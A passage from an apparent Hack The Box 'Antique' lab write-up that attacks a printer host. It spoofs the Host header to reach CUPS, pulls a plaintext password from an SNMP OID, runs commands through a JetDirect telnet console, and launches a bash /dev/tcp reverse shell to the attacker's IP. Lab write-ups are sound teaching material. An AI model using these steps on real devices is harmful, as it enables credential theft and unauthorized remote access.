</span></span><span class="line"><span class="cl">&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;unsel&#34;</span>&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/classes/&#34;</span>&gt;<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>Classes<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>&lt;/A&gt;&lt;/TD&gt;
</span></span><span class="line"><span class="cl">&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;unsel&#34;</span>&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/help/&#34;</span>&gt;<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>Online<span class="p">&amp;</span>nbsp<span class="p">;</span>Help<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>&lt;/A&gt;&lt;/TD&gt;
</span></span><span class="line"><span class="cl">&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;unsel&#34;</span>&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/jobs/&#34;</span>&gt;<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>Jobs<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>&lt;/A&gt;&lt;/TD&gt;
</span></span><span class="line"><span class="cl">&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;unsel&#34;</span>&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/printers/&#34;</span>&gt;<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>Printers<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>&lt;/A&gt;&lt;/TD&gt;
</span></span><span class="line"><span class="cl">&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;unsel&#34;</span> <span class="nv">WIDTH</span><span class="o">=</span><span class="s2">&#34;100%&#34;</span>&gt;&lt;FORM <span class="nv">ACTION</span><span class="o">=</span><span class="s2">&#34;/help/&#34;</span> <span class="nv">METHOD</span><span class="o">=</span><span class="s2">&#34;GET&#34;</span>&gt;&lt;INPUT
</span></span><span class="line"><span class="cl"><span class="nv">TYPE</span><span class="o">=</span><span class="s2">&#34;SEARCH&#34;</span> <span class="nv">NAME</span><span class="o">=</span><span class="s2">&#34;QUERY&#34;</span> <span class="nv">SIZE</span><span class="o">=</span><span class="s2">&#34;20&#34;</span> <span class="nv">PLACEHOLDER</span><span class="o">=</span><span class="s2">&#34;Search Help&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">AUTOSAVE</span><span class="o">=</span><span class="s2">&#34;org.cups.help&#34;</span> <span class="nv">RESULTS</span><span class="o">=</span><span class="s2">&#34;20&#34;</span>&gt;&lt;/FORM&gt;&lt;/TD&gt;
</span></span><span class="line"><span class="cl">&lt;TD&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s2">&#34;/images/right.gif&#34;</span> <span class="nv">WIDTH</span><span class="o">=</span><span class="s2">&#34;4&#34;</span> <span class="nv">HEIGHT</span><span class="o">=</span><span class="s2">&#34;36&#34;</span> <span class="nv">ALT</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;&lt;/TD&gt;
</span></span><span class="line"><span class="cl">&lt;/TR&gt;
</span></span><span class="line"><span class="cl">&lt;/TABLE&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;TABLE <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;indent&#34;</span> <span class="nv">SUMMARY</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;
</span></span><span class="line"><span class="cl">&lt;TR&gt;&lt;TD <span class="nv">STYLE</span><span class="o">=</span><span class="s2">&#34;padding-right: 20px;&#34;</span>&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;H1&gt;CUPS 1.6.1&lt;/H1&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;CUPS is the standards-based, open <span class="nb">source</span> printing system developed by
</span></span><span class="line"><span class="cl">&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.apple.com/&#34;</span>&gt;Apple Inc.&lt;/A&gt; <span class="k">for</span> OS&lt;SUP&gt;<span class="p">&amp;</span>reg<span class="p">;</span>&lt;/SUP&gt; X and
</span></span><span class="line"><span class="cl">other UNIX&lt;SUP&gt;<span class="p">&amp;</span>reg<span class="p">;</span>&lt;/SUP&gt;-like operating systems.&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;/TD&gt;
</span></span><span class="line"><span class="cl">&lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.cups.org/&#34;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s2">&#34;images/cups-icon.png&#34;</span> <span class="nv">WIDTH</span><span class="o">=</span><span class="s2">&#34;128&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">HEIGHT</span><span class="o">=</span><span class="s2">&#34;128&#34;</span> <span class="nv">ALT</span><span class="o">=</span><span class="s2">&#34;CUPS&#34;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span></span><span class="line"><span class="cl">&lt;/TR&gt;
</span></span><span class="line"><span class="cl">&lt;/TABLE&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;TABLE <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;indent&#34;</span> <span class="nv">SUMMARY</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;
</span></span><span class="line"><span class="cl">&lt;TR&gt;&lt;TD <span class="nv">VALIGN</span><span class="o">=</span><span class="s2">&#34;top&#34;</span> <span class="nv">STYLE</span><span class="o">=</span><span class="s2">&#34;border-right: dotted thin #cccccc; padding-right: 20px;&#34;</span>&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;H2&gt;CUPS <span class="k">for</span> Users&lt;/H2&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/overview.html&#34;</span>&gt;Overview of CUPS&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/options.html&#34;</span>&gt;Command-Line Printing and Options&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/whatsnew.html&#34;</span>&gt;What<span class="err">&#39;</span>s New in CUPS 1.6&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.cups.org/newsgroups.php?gcups.general&#34;</span>&gt;User Forum&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;/TD&gt;&lt;TD <span class="nv">VALIGN</span><span class="o">=</span><span class="s2">&#34;top&#34;</span> <span class="nv">STYLE</span><span class="o">=</span><span class="s2">&#34;border-right: dotted thin #cccccc; padding-left: 20px; padding-right: 20px;&#34;</span>&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;H2&gt;CUPS <span class="k">for</span> Administrators&lt;/H2&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;admin&#34;</span>&gt;Adding Printers and Classes&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/policies.html&#34;</span>&gt;Managing Operation Policies&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/accounting.html&#34;</span>&gt;Printer Accounting Basics&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/security.html&#34;</span>&gt;Server Security&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/kerberos.html&#34;</span>&gt;Using Kerberos Authentication&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/network.html&#34;</span>&gt;Using Network Printers&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/ref-cupsd-conf.html&#34;</span>&gt;cupsd.conf Reference&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.cups.org/ppd.php&#34;</span>&gt;Find Printer Drivers&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;/TD&gt;&lt;TD <span class="nv">VALIGN</span><span class="o">=</span><span class="s2">&#34;top&#34;</span> <span class="nv">STYLE</span><span class="o">=</span><span class="s2">&#34;padding-left: 20px;&#34;</span>&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;H2&gt;CUPS <span class="k">for</span> Developers&lt;/H2&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/api-overview.html&#34;</span>&gt;Introduction to CUPS Programming&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/api-cups.html&#34;</span>&gt;CUPS API&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/api-filter.html&#34;</span>&gt;Filter and Backend Programming&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/api-httpipp.html&#34;</span>&gt;HTTP and IPP APIs&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/api-ppd.html&#34;</span>&gt;PPD API&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/api-raster.html&#34;</span>&gt;Raster API&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/ref-ppdcfile.html&#34;</span>&gt;PPD Compiler Driver Information File Reference&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.cups.org/newsgroups.php?gcups.development&#34;</span>&gt;Developer Forum&lt;/A&gt;&lt;/P&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;/TD&gt;&lt;/TR&gt;
</span></span><span class="line"><span class="cl">&lt;/TABLE&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;/TD&gt;&lt;/TR&gt;
</span></span><span class="line"><span class="cl">&lt;TR&gt;&lt;TD&gt;<span class="p">&amp;</span>nbsp<span class="p">;</span>&lt;/TD&gt;&lt;/TR&gt;
</span></span><span class="line"><span class="cl">&lt;TR&gt;&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;trailer&#34;</span>&gt;CUPS and the CUPS logo are trademarks of
</span></span><span class="line"><span class="cl">&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.apple.com&#34;</span>&gt;Apple Inc.&lt;/A&gt; CUPS is copyright 2007-2012 Apple
</span></span><span class="line"><span class="cl">Inc. All rights reserved.&lt;/TD&gt;&lt;/TR&gt;
</span></span><span class="line"><span class="cl">&lt;/TABLE&gt;
</span></span><span class="line"><span class="cl">&lt;/BODY&gt;
</span></span><span class="line"><span class="cl">&lt;/HTML&gt;
</span></span></code></pre></div><p>According to <a href="https://stackoverflow.com/questions/54806076/cups-bad-request">this thread</a> on StackOverflow, CUPS only allows connection from localhost. But that&rsquo;s a bit weird because the server answered the GET request I sent from netcat.</p>
<p><div class="img-container"><img src="imgs/image-20211016040515575.png" alt="image-20211016040515575"  /></div>
</p>
<p>So I modified my HTTP host header value to 127.0.0.1 with <a href="https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/">this extension</a>, and then I refreshed the page.</p>
<p><div class="img-container"><img src="imgs/image-20211016040848654.png" alt="image-20211016040848654"  /></div>
</p>
<p>It worked 😮.</p>
<p>Among all the menus, &ldquo;administration&rdquo; is the one that&rsquo;s interesting.</p>
<p><div class="img-container"><img src="imgs/image-20211016041744700.png" alt="image-20211016041744700"  /></div>
</p>
<p>I can access all the buttons, including the edit configuration file button , but to modify the config, I will need a valid credentials.</p>
<p><div class="img-container"><img src="imgs/image-20211016043606267.png" alt="image-20211016043606267"  /></div>
</p>
<h3 id="tcp-9797---cups">TCP 9797 - CUPS</h3>
<p>This port also an HTTP server, so I can use <code>netcat</code> as well, but then the response looks familiar.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ nc -vn 10.10.11.107 <span class="m">9797</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">9797</span> <span class="o">(</span>?<span class="o">)</span> open
</span></span><span class="line"><span class="cl">GET /
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTTP/0.9 <span class="m">200</span> OK 
</span></span><span class="line"><span class="cl">Date: Fri, <span class="m">15</span> Oct <span class="m">2021</span> 21:18:29 GMT
</span></span><span class="line"><span class="cl">Server: CUPS/1.6
</span></span><span class="line"><span class="cl">Content-Language: en_US
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span></span><span class="line"><span class="cl">Last-Modified: Thu, <span class="m">13</span> May <span class="m">2021</span> 05:36:41 GMT
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">3792</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>Turns out that this port return the same response as on port 9090.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> -e <span class="s1">&#39;GET /\n&#39;</span> <span class="p">|</span> nc -vn 10.10.11.107 <span class="m">9797</span> &gt; /dev/null <span class="p">|</span> wc -c <span class="o">&amp;&amp;</span> <span class="nb">echo</span> -e <span class="s1">&#39;GET /\n&#39;</span> <span class="p">|</span> nc -vn 10.10.11.107 <span class="m">9090</span> &gt; /dev/null <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">9797</span> <span class="o">(</span>?<span class="o">)</span> open
</span></span><span class="line"><span class="cl"><span class="m">3999</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">9090</span> <span class="o">(</span>?<span class="o">)</span> open
</span></span><span class="line"><span class="cl"><span class="m">3999</span>
</span></span></code></pre></div><h3 id="udp-161---snmp">UDP 161 - SNMP</h3>
<p>I recently had encountered SNMP in <a href="hackthebox/pit/">HTB: Pit</a>, so since it&rsquo;s hierarchical, I tried to do something like path traversal, and here&rsquo;s what I got:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ snmpwalk -v 2c -c public 10.10.11.107                                 
</span></span><span class="line"><span class="cl">iso.3.6.1.2.1 <span class="o">=</span> STRING: <span class="s2">&#34;HTB Printer&#34;</span>
</span></span><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ snmpwalk -v 2c -c public 10.10.11.107 iso.3.6.1.2                  
</span></span><span class="line"><span class="cl">iso.3.6.1.2.1 <span class="o">=</span> STRING: <span class="s2">&#34;HTB Printer&#34;</span>
</span></span><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ snmpwalk -v 2c -c public 10.10.11.107 iso.3.6.1  
</span></span><span class="line"><span class="cl">iso.3.6.1.2.1 <span class="o">=</span> STRING: <span class="s2">&#34;HTB Printer&#34;</span>
</span></span><span class="line"><span class="cl">iso.3.6.1.4.1.11.2.3.9.1.1.13.0 <span class="o">=</span> BITS: <span class="m">50</span> <span class="m">40</span> <span class="m">73</span> <span class="m">73</span> <span class="m">77</span> <span class="m">30</span> <span class="m">72</span> <span class="m">64</span> <span class="m">40</span> <span class="m">31</span> <span class="m">32</span> <span class="m">33</span> <span class="m">21</span> <span class="m">21</span> <span class="m">31</span> <span class="m">32</span> 
</span></span><span class="line"><span class="cl"><span class="m">33</span> <span class="m">1</span> <span class="m">3</span> <span class="m">9</span> <span class="m">17</span> <span class="m">18</span> <span class="m">19</span> <span class="m">22</span> <span class="m">23</span> <span class="m">25</span> <span class="m">26</span> <span class="m">27</span> <span class="m">30</span> <span class="m">31</span> <span class="m">33</span> <span class="m">34</span> <span class="m">35</span> <span class="m">37</span> <span class="m">38</span> <span class="m">39</span> <span class="m">42</span> <span class="m">43</span> <span class="m">49</span> <span class="m">50</span> <span class="m">51</span> <span class="m">54</span> <span class="m">57</span> <span class="m">58</span> <span class="m">61</span> <span class="m">65</span> <span class="m">74</span> <span class="m">75</span> <span class="m">79</span> <span class="m">82</span> <span class="m">83</span> <span class="m">86</span> <span class="m">90</span> <span class="m">91</span> <span class="m">94</span> <span class="m">95</span> <span class="m">98</span> <span class="m">103</span> <span class="m">106</span> <span class="m">111</span> <span class="m">114</span> <span class="m">115</span> <span class="m">119</span> <span class="m">122</span> <span class="m">123</span> <span class="m">126</span> <span class="m">130</span> <span class="m">131</span> <span class="m">134</span> <span class="m">135</span> 
</span></span></code></pre></div><p>The last response is interesting, and it&rsquo;s a password.</p>
<p><div class="img-container"><img src="imgs/image-20211016051117785.png" alt="image-20211016051117785"  /></div>
</p>
<p>According to <a href="https://book.hacktricks.xyz/pentesting/pentesting-printers/credentials-disclosure-brute-force">HackTrick</a>, it&rsquo;s a vulnerable OID that will returns printer&rsquo;s password when queried.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ snmpwalk -v 2c -c public 10.10.11.107 iso.3.6.1.4.1.11.2.3.9.1.1.13.0
</span></span><span class="line"><span class="cl">iso.3.6.1.4.1.11.2.3.9.1.1.13.0 <span class="o">=</span> BITS: <span class="m">50</span> <span class="m">40</span> <span class="m">73</span> <span class="m">73</span> <span class="m">77</span> <span class="m">30</span> <span class="m">72</span> <span class="m">64</span> <span class="m">40</span> <span class="m">31</span> <span class="m">32</span> <span class="m">33</span> <span class="m">21</span> <span class="m">21</span> <span class="m">31</span> <span class="m">32</span> 
</span></span><span class="line"><span class="cl"><span class="m">33</span> <span class="m">1</span> <span class="m">3</span> <span class="m">9</span> <span class="m">17</span> <span class="m">18</span> <span class="m">19</span> <span class="m">22</span> <span class="m">23</span> <span class="m">25</span> <span class="m">26</span> <span class="m">27</span> <span class="m">30</span> <span class="m">31</span> <span class="m">33</span> <span class="m">34</span> <span class="m">35</span> <span class="m">37</span> <span class="m">38</span> <span class="m">39</span> <span class="m">42</span> <span class="m">43</span> <span class="m">49</span> <span class="m">50</span> <span class="m">51</span> <span class="m">54</span> <span class="m">57</span> <span class="m">58</span> <span class="m">61</span> <span class="m">65</span> <span class="m">74</span> <span class="m">75</span> <span class="m">79</span> <span class="m">82</span> <span class="m">83</span> <span class="m">86</span> <span class="m">90</span> <span class="m">91</span> <span class="m">94</span> <span class="m">95</span> <span class="m">98</span> <span class="m">103</span> <span class="m">106</span> <span class="m">111</span> <span class="m">114</span> <span class="m">115</span> <span class="m">119</span> <span class="m">122</span> <span class="m">123</span> <span class="m">126</span> <span class="m">130</span> <span class="m">131</span> <span class="m">134</span> <span class="m">135</span>
</span></span></code></pre></div><h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<p>I couldn&rsquo;t determine the FTP version, but for port 9797 and 9090, it&rsquo;s revealed that they are using the same version of CUPS, which is 1.6.1.  If you notice the copyright at the bottom (2007-2012), the CUPS version seems pretty old.</p>
<p>Throwing CUPS on <code>searchsploit</code> pops up a bunch of exploits, but on Google, there is a metasploit module for 1.6.1: <a href="https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/">File Read vulnerability</a>.</p>
<p><div class="img-container"><img src="imgs/image-20211016043745272.png" alt="image-20211016043745272"  /></div>
</p>
<p>To use that module I&rsquo;ll need a system access first.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-lp">Shell as lp</h3>
<h4 id="ftp-access">FTP Access</h4>
<p>The password I obtained from SNMP enumeration works on FTP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ nc -vn 10.10.11.107 <span class="m">23</span>  
</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">23</span> <span class="o">(</span>telnet<span class="o">)</span> open
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HP JetDirect
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Password: P@ssw0rd@123!!123
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Please <span class="nb">type</span> <span class="s2">&#34;?&#34;</span> <span class="k">for</span> HELP
</span></span><span class="line"><span class="cl">&gt; ?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">To Change/Configure Parameters Enter:
</span></span><span class="line"><span class="cl">Parameter-name: value &lt;Carriage Return&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Parameter-name Type of value
</span></span><span class="line"><span class="cl">ip: IP-address in dotted notation
</span></span><span class="line"><span class="cl">subnet-mask: address in dotted notation <span class="o">(</span>enter <span class="m">0</span> <span class="k">for</span> default<span class="o">)</span>
</span></span><span class="line"><span class="cl">default-gw: address in dotted notation <span class="o">(</span>enter <span class="m">0</span> <span class="k">for</span> default<span class="o">)</span>
</span></span><span class="line"><span class="cl">syslog-svr: address in dotted notation <span class="o">(</span>enter <span class="m">0</span> <span class="k">for</span> default<span class="o">)</span>
</span></span><span class="line"><span class="cl">idle-timeout: seconds in integers
</span></span><span class="line"><span class="cl">set-cmnty-name: alpha-numeric string <span class="o">(</span><span class="m">32</span> chars max<span class="o">)</span>
</span></span><span class="line"><span class="cl">host-name: alpha-numeric string <span class="o">(</span>upper <span class="k">case</span> only, <span class="m">32</span> chars max<span class="o">)</span>
</span></span><span class="line"><span class="cl">dhcp-config: <span class="m">0</span> to disable, <span class="m">1</span> to <span class="nb">enable</span>
</span></span><span class="line"><span class="cl">allow: &lt;ip&gt; <span class="o">[</span>mask<span class="o">]</span> <span class="o">(</span><span class="m">0</span> to clear, list to display, <span class="m">10</span> max<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">addrawport: &lt;TCP port num&gt; <span class="o">(</span>&lt;TCP port num&gt; 3000-9000<span class="o">)</span>
</span></span><span class="line"><span class="cl">deleterawport: &lt;TCP port num&gt;
</span></span><span class="line"><span class="cl">listrawport: <span class="o">(</span>No parameter required<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">exec: execute system commands <span class="o">(</span><span class="nb">exec</span> id<span class="o">)</span>
</span></span><span class="line"><span class="cl">exit: quit from telnet session
</span></span><span class="line"><span class="cl">&gt;
</span></span></code></pre></div><p>Since it allows me to execute system commands, I can read the user flag directly from FTP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; <span class="nb">exec</span> id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>7<span class="o">(</span>lp<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>7<span class="o">(</span>lp<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>7<span class="o">(</span>lp<span class="o">)</span>,19<span class="o">(</span>lpadmin<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">exec</span> ls -l
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> lp   lp <span class="m">1959</span> Sep <span class="m">27</span> 07:12 telnet.py
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root lp   <span class="m">33</span> Oct <span class="m">15</span> 05:14 user.txt
</span></span><span class="line"><span class="cl">&gt; <span class="nb">exec</span> cat user.txt
</span></span><span class="line"><span class="cl">a2aeb10a550bd9c53c2213491432ad52
</span></span></code></pre></div><h4 id="reverse-shell">Reverse Shell</h4>
<p>I will execute the reverse shell command, and catch it on my nc listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; <span class="nb">exec</span> which bash
</span></span><span class="line"><span class="cl">/usr/bin/bash
</span></span><span class="line"><span class="cl">&gt; <span class="nb">exec</span> bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.13/53 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.13<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">45184</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>821<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">lp@antique:~$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">lp@antique:~$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">lp@antique:~$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">9729</span> suspended  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">9729</span> continued  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">lp@antique:~$ 
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="file-read">File read</h3>
<h4 id="cups-root-file-read">CUPS Root File read</h4>
